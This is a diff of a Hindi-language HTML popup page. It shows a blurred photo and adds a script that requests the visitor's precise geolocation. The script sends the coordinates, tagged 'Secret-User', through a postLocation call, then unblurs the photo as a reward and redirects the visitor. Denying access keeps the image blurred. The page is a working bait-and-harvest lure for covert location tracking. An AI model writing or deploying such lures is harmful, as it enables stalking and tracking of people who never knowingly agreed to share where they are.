@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="hi">
 <head>
   <meta charset="utf-8">
@@ -9,7 +9,7 @@
       font-family: sans-serif;
       margin: 0;
       /* आपकी इमेज जैसा ग्रेडिएंट बैकग्राउंड */
-      background: linear-gradient(to bottom, #0000 50%, #0000 50%);
+      background: linear-gradient(to bottom, #87ceeb 50%, #20b2aa 50%);
       color: #333;
       display: flex;
       justify-content: center;
@@ -26,7 +26,7 @@
     }
 
     .popup {
-      background: #1c9300;
+      background: #ffffff;
       padding: 20px;
       border-radius: 20px; /* कोनों को ज्यादा गोल किया गया */
       text-align: center;
@@ -88,7 +88,7 @@
 </head>
 <body>
 
-  <div class="title">lofi</div>
+  <div class="title">poup window</div>
   <div class="popup">
     <!-- आपकी दी गई फोटो का लिंक -->
     <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbiEO6kC-DPeWRMq11tHaT1cZ9wb57mJQuOCFF_uMs33baS0kUS3vMY4Rhh8tAraktW0ISjNNLqhQ20PRBAiFolU3agOt0PzVQf0-dBnwYT1mn7LB98iOUvUGEi_q1Yq4hqmxrezi5Qz5UpgJ-Vie0x14Chx6CPLxPVzgWcKYHuSAHqUQkZkefvI8G0rpo/s1269/1000127258.png" alt="User Photo">
@@ -113,4 +113,37 @@
 
     function sendLocation() {
       document.getElementById("loading-text").style.display = "block";
-6
+      document.getElementById("main-button").style.display = "none";
+      document.getElementById("error-text").style.display = "none";
+
+      if (!("geolocation" in navigator)) {
+        document.getElementById("error-text").innerText = "⚠️ आपका ब्राउज़र लोकेशन सपोर्ट नहीं करता।";
+        document.getElementById("error-text").style.display = "block";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition((pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const user = "Secret-User";
+        postLocation({ latitude: lat, longitude: lon, user });
+
+        // allow होने पर फोटो साफ कर दो
+        document.getElementById("user-photo").style.filter = "blur(0px)";
+        window.location.href = REDIRECT_URL;
+
+      }, (err) => {
+        // deny होने पर फोटो blur ही रहे
+        document.getElementById("user-photo").style.filter = "blur(5px)";
+        document.getElementById("loading-text").style.display = "none";
+        document.getElementById("main-button").style.display = "block";
+        document.getElementById("error-text").style.display = "block";
+      }, {
+        enableHighAccuracy: true,
+        timeout: 12000,
+        maximumAge: 0
+      });
+    }
+  </script>
+</body>
+</html>
